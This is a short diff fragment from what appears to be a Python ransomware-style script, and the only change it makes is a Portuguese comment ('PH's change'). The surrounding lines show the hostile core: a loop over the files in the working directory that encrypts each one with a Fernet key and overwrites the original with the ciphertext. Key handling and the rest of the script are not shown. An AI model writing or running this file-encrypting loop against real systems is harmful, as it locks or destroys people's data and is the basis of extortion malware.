@@ -16,3 +16,4 @@ for file in os.listdir():
     encrypted = Fernet(key).encrypt(content)
     with open(file, "wb") as f:
       f.write(encrypted)
+#alteração do PH
